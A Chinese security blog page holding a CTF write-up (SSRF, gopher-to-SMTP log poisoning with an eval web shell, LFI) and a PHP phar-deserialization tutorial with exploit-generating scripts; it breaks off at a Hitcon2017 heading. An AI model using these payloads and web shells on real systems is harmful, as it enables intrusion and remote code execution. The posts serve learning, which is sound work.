
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>离怀秋</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="离怀秋">
<meta property="og:url" content="http://yoursite.com/page/6/index.html">
<meta property="og:site_name" content="离怀秋">
<meta property="article:author" content="离怀秋">
<meta name="twitter:card" content="summary">
  
    <link rel="alternative" href="/atom.xml" title="离怀秋" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
<link rel="stylesheet" href="/css/style.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 4.2.1"></head>
<body>
<div id="container">
  <div id="wrap">
    <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">离怀秋</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">心未死 战未败</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
          <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="Search">
          <input type="submit" value="" class="search-form-submit">
          <input name=tn type=hidden value="bds">
          <input name=cl type=hidden value="3">
          <input name=ct type=hidden value="2097152">
          <input type="hidden" name="si" value="yoursite.com">
        </form>
      </div>
    </div>
  </div>
</header>
    <div class="outer">
      <section id="main">
  
    <article id="post-安恒六月赛web部分" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/03/%E5%AE%89%E6%81%92%E5%85%AD%E6%9C%88%E8%B5%9Bweb%E9%83%A8%E5%88%86/" class="article-date">
  <time datetime="2019-07-03T01:32:06.000Z" itemprop="datePublished">2019-07-03</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/03/%E5%AE%89%E6%81%92%E5%85%AD%E6%9C%88%E8%B5%9Bweb%E9%83%A8%E5%88%86/">安恒六月赛web部分</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="Web1-localview"><a href="#Web1-localview" class="headerlink" title="Web1 localview"></a>Web1 localview</h3><p>进入后扫一下目录,发现<code>admin.php</code>，不过没有权限访问，要以<code>local</code>的形式进入才能得到<code>flag</code></p>
<p><img src="https://s2.ax1x.com/2019/07/03/ZYdEK1.png" alt="ZYdEK1.png"></p>
<p>利用<code>host+client-ip+X-Forwarded-For</code>伪造ip（这里<code>127.0.0.1</code>和<code>localhost</code>..不太一样..挺伤的..)，最终<code>payload</code>如下:</p>
<p><img src="https://s2.ax1x.com/2019/07/03/ZYdMPe.png" alt="ZYdMPe.png"></p>
<h3 id="Web2-easypentest"><a href="#Web2-easypentest" class="headerlink" title="Web2 easypentest"></a>Web2 easypentest</h3><p>首先特别感谢<code>南溟师傅</code>所提供的环境以及帮助(大力感谢)还有出题人的<code>docker</code>,这道题踩了很多坑..题目中的<code>smtp</code>服务也被我打挂了4次..(感谢机器人小姐姐)</p>
<p>进入题目后发现一段代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$x = $_GET[<span class="string">'x'</span>];</span><br><span class="line">$pos = strpos($x,<span class="string">"php"</span>);</span><br><span class="line"><span class="keyword">if</span>($pos)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"denied"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch,CURLOPT_URL,<span class="string">"$x"</span>);</span><br><span class="line">curl_setopt($ch,CURLOPT_RETURNTRANSFER,<span class="keyword">true</span>);</span><br><span class="line">$result = curl_exec($ch);</span><br><span class="line"><span class="keyword">echo</span> $result;</span><br></pre></td></tr></table></figure>

<p>大概意思是过滤掉了<code>php</code>关键字，但是可以二次编码绕过，而且可以看出是存在<code>SSRF</code>漏洞的。</p>
<p>通过<code>ssrf</code>读取一下<code>flag.php</code>试一下</p>
<p><img src="https://s2.ax1x.com/2019/07/03/ZYwio8.png" alt="ZYwio8.png"></p>
<p>题目提示这个<code>flag.php</code>是没有<code>flag</code>的,并且顺道给了提示在<code>/etc/hosts</code>有点东西</p>
<p>同样的<code>file</code>协议访问一下得到了一个内网<code>ip</code>:172.18.0.3,用burp对这个网段进行一下<code>fuzz</code>，并没有发现<code>mysql,Redis或者Fastcgi</code>等常见内网应用，倒是发现了25端口的<code>smtp</code>邮件服务以及<code>172.18.0.2</code>的一个<code>文件包含</code>,不过当时比赛的时候时间剩的比较少了，直接周周练查了相关资料才大概做出来。这道题所利用的知识点是<code>SMTP日志投毒+LFI</code></p>
<p><strong>原理为</strong>：当我们尝试利用<code>SMTP</code>服务处理邮件时,<code>mail.log</code>会自动添加每个邮件的相关日志,其实这一点和<code>php mail</code>函数的漏洞是很相似的，在mail函数中我们可以通过<code>-oQ /tmp -X /var/www/html/webshell.php</code>将日志文件写在<code>html</code>目录下的<code>webshell.php</code>中,而这个日志文件是自动被包含到<code>mail.log</code>，如果可以配合文件包含自然可以<code>getshell.</code></p>
<p>首先通过<code>gopher</code>协议攻击内网<code>SMTP</code>将恶意代码写入<code>/var/log/mail.log</code>，gopher转化脚本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$commands = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'south'</span>,</span><br><span class="line">    <span class="string">'MAIL FROM:&lt;i@southseast&gt;'</span>,</span><br><span class="line">    <span class="string">'RCPT TO:&lt;script language="php"&gt;phpinfo();@eval($_GET[_]);&lt;/script&gt;'</span>,</span><br><span class="line">    <span class="string">'DATA'</span>,</span><br><span class="line">   <span class="string">' south'</span>,</span><br><span class="line">    <span class="string">'.'</span></span><br><span class="line">);</span><br><span class="line">$payload = implode(<span class="string">'%0A'</span>, $commands);</span><br><span class="line">$url=<span class="string">"gopher://172.18.0.2:25/_"</span>.urlencode($payload);</span><br><span class="line">$true_url=str_replace(<span class="string">"php"</span>,<span class="string">"%25%37%30hp"</span>,$url);</span><br><span class="line">$true_url=str_replace(<span class="string">"\t"</span>,<span class="string">""</span>,$true_url);</span><br><span class="line"><span class="keyword">echo</span> $true_url;</span><br><span class="line"><span class="comment">#echo "http://120.77.215.95/index.php?x=gopher://172.18.0.2:25/_" . $true_url;</span></span><br><span class="line">header(<span class="string">'location: http://120.77.215.95/index.php?x=gopher://172.18.0.2:25/_'</span> . $true_url);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个脚本是南溟师傅的脚本，<strong><code>%0A</code>的目的是将SMTP命令连接到以%0A分隔的一行中，并强制服务器在实际发送有效SMTP请求时向SMTP服务器发送gopher.</strong></p>
<p>我之前一直是用<code>gopherus</code>生成的，不过<code>gopherus</code>所生成的<code>payload</code>很容易把smtp打挂，不过有时候也可以正常生成，下面是利用<code>gopherus</code>打成功的截图</p>
<p><img src="https://s2.ax1x.com/2019/07/03/ZYBPPS.jpg" alt="ZYBPPS.jpg"></p>
<p>命令为<code>ls /</code>，不过一到关键<code>cat flag</code>步骤就是挂…很是迷..后来就在<code>docker</code>中实验了</p>
<p>这里还要说明一下为什么..用的是<code>&lt;script language=&quot;php&quot;&gt;phpinfo();@eval($_GET[_]);&lt;/script&gt;</code></p>
<p>这种形式..而不是<code>&lt;?php xxx?&gt;</code>这种形式.因为在实际的gopher打过去的时候回把我的?转化为\t,所以就用<code>script</code>形式了，恰巧<code>php</code>版本支持，生成的<code>gopher</code>为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;172.18.0.2:25&#x2F;_south%250AMAIL+FROM%3A%3Ci%40southseast%3E%250ARCPT+TO%3A%3Cscript+language%3D%22%25%37%30hp%22%3E%25%37%30hpinfo%28%29%3B%40eval%28%24_GET%5B_%5D%29%3B%3C%2Fscript%3E%250ADATA%250A+south%250A.</span><br></pre></td></tr></table></figure>

<p>将gopher协议打过去后，利用文件包含包含日志文件<code>/var/log/mail.log</code></p>
<p><img src="https://s2.ax1x.com/2019/07/03/ZYciGV.png" alt="ZYciGV.png"></p>
<p>最后拿到<code>flag</code>（需要注意二次编码..如：<code>%26_=ls%2520/</code>==<code>&amp;_=ls /</code></p>
<p>最后看了下挂了的问题，利用<code>php://filter</code>协议读取<code>log</code>并且将<code>docker</code>中的<code>log</code>和题目中挂了的log保存到自己服务器进行文件包含，发现docker中的可以正常解析，而题目中的包含后直接返回500..这也就是为什么我的马写进去了而无法正确解析的原因把..<code>gopherus</code>的截图如下</p>
<p><img src="https://s2.ax1x.com/2019/07/03/ZYBXJU.png" alt="ZYBXJU.png"></p>
<p>或许参数不太相同也是挂的原因之一.</p>
<p>还要说一下包含apache日志思路行不通的问题，可能很多人的思路都是用错误日志或者日志<code>getshell</code>，不过因为题目对log文件的限制，是不能包含到日志文件的.所以思路只能走<code>smtp日志投毒+LFI</code>了。补充一下出题人的docker镜像  <a href="qq://txfile/#">registry.cn-hangzhou.aliyuncs.com/bypass/postfix</a>(从这道题还是学到了很多的hh</p>
<h4 id="t解决方案"><a href="#t解决方案" class="headerlink" title="\t解决方案"></a>\t解决方案</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$commands = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'south'</span>,</span><br><span class="line">    <span class="string">'MAIL FROM: &lt;i@southseast&gt;'</span>,</span><br><span class="line">    <span class="string">'RCPT TO: %3C%3Fphp%20eval(%24_POST%5B%22south%22%5D)%3F%3E'</span>,</span><br><span class="line">    <span class="string">'DATA'</span>,</span><br><span class="line">    <span class="string">'south'</span>,</span><br><span class="line">    <span class="string">'.'</span></span><br><span class="line">);</span><br><span class="line">$payload = implode(<span class="string">'%0A'</span>, $commands);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'http://120.77.215.95/index.php?x=gopher://172.18.0.2:25/_'</span> . urlencode($payload);</span><br><span class="line"><span class="comment">//header('location:http://120.77.215.95/index.php?x=gopher://172.18.0.2:25/_' . urlencode($payload));</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>需要先将<code>?</code>进行编码操作。</p>
<p><img src="https://s2.ax1x.com/2019/07/03/ZY6L28.png" alt="ZY6L28.png"></p>
<p>经过一番尝试..?不编码就是会被作为<code>\t</code>的</p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/07/03/%E5%AE%89%E6%81%92%E5%85%AD%E6%9C%88%E8%B5%9Bweb%E9%83%A8%E5%88%86/" data-id="ckabsu397003rkkvrdx5o2qqr" class="article-share-link" data-share="baidu" data-title="安恒六月赛web部分">Share</a>
      

      
        <a href="http://yoursite.com/2019/07/03/%E5%AE%89%E6%81%92%E5%85%AD%E6%9C%88%E8%B5%9Bweb%E9%83%A8%E5%88%86/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-利用phar反序列化拓展攻击面" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/06/30/%E5%88%A9%E7%94%A8phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2/" class="article-date">
  <time datetime="2019-06-30T15:07:05.000Z" itemprop="datePublished">2019-06-30</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/06/30/%E5%88%A9%E7%94%A8phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2/">利用phar反序列化拓展攻击面</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>说是要写一下<code>phar</code>反序列化的东西，但是首先还是想写一些<code>php</code>反序列化的要点，来加深一下理解。</p>
<h3 id="php反序列化要点"><a href="#php反序列化要点" class="headerlink" title="php反序列化要点"></a>php反序列化要点</h3><p>在圆圆师傅的博客中看到<code>php</code>反序列漏洞的小名叫做<code>php</code>对象的属性篡改漏洞，真的觉得这个称呼再合适不过了<code>hhhh</code>，因为反序列化中传递的只用属性的值，以及对应的属性的权限(即<code>private,public,protected</code>)</p>
<h4 id="常用魔术方法作用："><a href="#常用魔术方法作用：" class="headerlink" title="常用魔术方法作用："></a>常用魔术方法作用：</h4><ul>
<li><code>construct()</code>:当对象创建时自动调用(也就是<code>new</code>的时候),要注意的是<code>construct</code>在<code>unserialize</code>时是不会自动调用的</li>
<li><code>wakeup()</code>：<code>unserialize()</code>时自动调用</li>
<li><code>sleep()</code>: <code>serialize()</code>时自动调用</li>
<li><code>toString()</code>:当对象被当作字符串输出时调用</li>
<li><code>get()</code>：当调用不可访问或者不存在的属性，调用此方法</li>
<li><code>call()</code>：当调用不存在的方法时，调用</li>
</ul>
<h4 id="关于toString的一些tip-触发条件如下："><a href="#关于toString的一些tip-触发条件如下：" class="headerlink" title="关于toString的一些tip,触发条件如下："></a>关于<code>toString</code>的一些<code>tip</code>,触发条件如下：</h4><p>(1)<code>echo ($obj) / print($obj)</code> 打印时会触发</p>
<p>(2)反序列化对象与字符串连接时</p>
<p>(3)反序列化对象参与格式化字符串时</p>
<p>(4)反序列化对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型）</p>
<p>(5)反序列化对象参与格式化<code>SQL语句</code>，绑定参数时</p>
<p>(6)反序列化对象在经过<code>php字符串函数</code>，如 <code>strlen()、addslashes()</code>时</p>
<p>(7)在<code>in_array()</code>方法中，第一个参数是反序列化对象，第二个参数的数组中有<strong>toString返回的字符串的时候</strong><code>toString</code>会被调用</p>
<p>(8)反序列化的对象作为 <code>class_exists()</code>的参数的时候</p>
<h4 id="易忽略的属性值"><a href="#易忽略的属性值" class="headerlink" title="易忽略的属性值"></a>易忽略的属性值</h4><p>对于<code>public</code>属性的成员不用在意，但对于<code>private</code>和<code>protected</code>的成员一定要特别注意<code>%00</code>,这个点直接输出是看不到的，不过我们可以通过查看网页源代码来避免这个问题。</p>
<p><img src="https://s2.ax1x.com/2019/06/30/Z1H981.png" alt="Z1H981.png"></p>
<p>将方块改为<code>%00</code>就ok。</p>
<h4 id="反序列化限制条件"><a href="#反序列化限制条件" class="headerlink" title="反序列化限制条件"></a>反序列化限制条件</h4><ul>
<li>有<code>unserialize</code>函数。</li>
<li>在反序列化的时候一定要在当前作用域进行。</li>
<li>反序列化攻击实际为属性篡改攻击。</li>
<li>反序列化参数可以控制</li>
</ul>
<h3 id="由phar反序列化拓展的攻击面"><a href="#由phar反序列化拓展的攻击面" class="headerlink" title="由phar反序列化拓展的攻击面"></a>由phar反序列化拓展的攻击面</h3><p>正常的<code>php</code>反序列化限制条件是很多的，如：要有<code>unserialize</code>函数，参数要可控，要在当前作用域进行(其实<code>phar</code>反序列化也要),但是<code>phar</code>反序列化则打破了这一常规，即<strong>不通过<code>unserialize</code>就可以进行反序列化</strong>。</p>
<h4 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a><strong>phar文件结构</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Phar%E6%A0%BC%E5%BC%8F%E5%BF%85%E9%A1%BB%E8%A6%81%E6%B1%82%E7%9A%84.png" alt="此处输入图片的描述"></p>
<ul>
<li><strong>a stub</strong></li>
</ul>
<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/stub.png" alt="此处输入图片的描述"></p>
<p><code>phar</code>文件将<code>php</code>复杂化的结构形式为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</span><br></pre></td></tr></table></figure>

<p>(这里其实通过修改前面的xxx就可以进行文件伪造)</p>
<ul>
<li><strong>a manifest describing the contents</strong></li>
</ul>
<p>这里其实是<code>phar</code>反序列化中比较重要的一点，<code>phar</code>本身为一个压缩文件，而<code>phar</code>文件则储存着每个文件的权限与属性信息，并且以序列化的形式储存用户自定义的<code>meta-data</code></p>
<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/phar%20manifest.png" alt="此处输入图片的描述"></p>
<ul>
<li><strong>the file contents</strong></li>
</ul>
<p>此部分内容为添加在<code>phar</code>添加的压缩文件以及内容。</p>
<ul>
<li><strong>signature</strong></li>
</ul>
<p>签名，放在末尾。</p>
<h4 id="构造phar压缩文件"><a href="#构造phar压缩文件" class="headerlink" title="构造phar压缩文件"></a><strong>构造phar压缩文件</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class TestObject &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(&quot;phar.phar&quot;);</span><br><span class="line">    $phar &#x3D; new Phar(&quot;phar.phar&quot;); &#x2F;&#x2F;后缀名必须为phar</span><br><span class="line"></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line"></span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置stub</span><br><span class="line"></span><br><span class="line">    $o &#x3D; new TestObject();</span><br><span class="line"></span><br><span class="line">    $phar-&gt;setMetadata($o); &#x2F;&#x2F;将自定义的meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;添加要压缩的文件</span><br><span class="line">    &#x2F;&#x2F;签名自动计算</span><br><span class="line"></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>要注意的是一定要在<code>php.ini</code>中关闭<code>phar-readonly</code>,我在<code>windows</code>弄的有点迷，所以直接在<code>ubuntu</code>上弄了，还蛮流畅的。</p>
<p><img src="https://s2.ax1x.com/2019/06/30/Z1zMxH.png" alt="Z1zMxH.png"></p>
<p>通过<code>winhex</code>可以更清晰的看到我们的属性已经被序列化</p>
<p><img src="https://s2.ax1x.com/2019/06/30/Z1zsZq.png" alt="Z1zsZq.png"></p>
<p>测试代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Destruct called'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filename = <span class="string">'phar://phar.phar/test.txt'</span>;</span><br><span class="line">    file_get_contents($filename); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>从下面图片可以看出已经成功进行了反序列化</p>
<p><img src="https://s2.ax1x.com/2019/06/30/Z3SJX9.png" alt="Z3SJX9.png"></p>
<p>受<code>phar</code>反序列化影响的文件函数还有：</p>
<p><img src="https://s2.ax1x.com/2019/07/03/ZYgm6S.png" alt="ZYgm6S.png"></p>
<p>可以<code>phar</code>反序列化的攻击面还是很广的。</p>
<h3 id="phar反序列化实战"><a href="#phar反序列化实战" class="headerlink" title="phar反序列化实战"></a>phar反序列化实战</h3><p>在安全客上看到了一位师傅写的比较简单的<code>phar</code>反序列化练习代码，拿来练一下手</p>
<p>简单入门</p>
<p>index.html</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://localhost/test/upload.php"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"hpdoger"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>upload.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*返回后缀名函数*/</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getExt</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> substr($filename,strripos($filename,<span class="string">'.'</span>)+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*检测MIME类型是否为gif*/</span></span><br><span class="line"><span class="keyword">if</span>($_FILES[<span class="string">'hpdoger'</span>][<span class="string">'type'</span>] != <span class="string">"image/gif"</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Not allowed !"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $filenameExt = strtolower(getExt($_FILES[<span class="string">'hpdoger'</span>][<span class="string">'name'</span>]));    <span class="comment">/*提取后缀名*/</span></span><br><span class="line"></span><br><span class="line">​    <span class="keyword">if</span>($filenameExt != <span class="string">'gif'</span>)&#123;</span><br><span class="line">​        <span class="keyword">echo</span> <span class="string">"Not gif !"</span>;</span><br><span class="line">​    &#125;</span><br><span class="line">​    <span class="keyword">else</span>&#123;</span><br><span class="line">​        move_uploaded_file($_FILES[<span class="string">'hpdoger'</span>][<span class="string">'tmp_name'</span>], $_FILES[<span class="string">'hpdoger'</span>][<span class="string">'name'</span>]);</span><br><span class="line">​        <span class="keyword">echo</span> <span class="string">"Successfully！"</span>;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>attack.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $recieve = $_GET[<span class="string">'recieve'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/*写入文件类操作*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">not_useful</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $file;</span><br><span class="line"></span><br><span class="line">​    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">​    $fp = fopen(<span class="string">"F:\\phpstudy\\WWW\\test\shell.php"</span>,<span class="string">"w"</span>); <span class="comment">//自定义写入路径</span></span><br><span class="line">​    fputs($fp,<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">​    fclose($fp);</span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line">file_get_contenecieve);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>攻击<code>exp</code>生成代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">not_useful</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $file=<span class="string">"&lt;?php phpinfo();?&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line"></span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89A"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> not_useful();</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>将生成的<code>phar.phar</code>改为<code>phar.gif</code>上传，在<code>attack.php</code>中访问<a href="http://localhost/test/attack.php?recieve=phar://phar.gif/text.txt" target="_blank" rel="noopener">http://localhost/test/attack.php?recieve=phar://phar.gif/text.txt</a></p>
<p>最后访问<code>shell.php</code></p>
<p><img src="https://s2.ax1x.com/2019/06/30/Z3CHnH.png" alt="Z3CHnH.png"></p>
<p>成功执行。</p>
<h4 id="Hitcon2017"><a href="#Hitcon2017" class="headerlink" title="Hitcon2017"></a><strong>Hitcon2017</strong></h4><p>代码如下：</p>
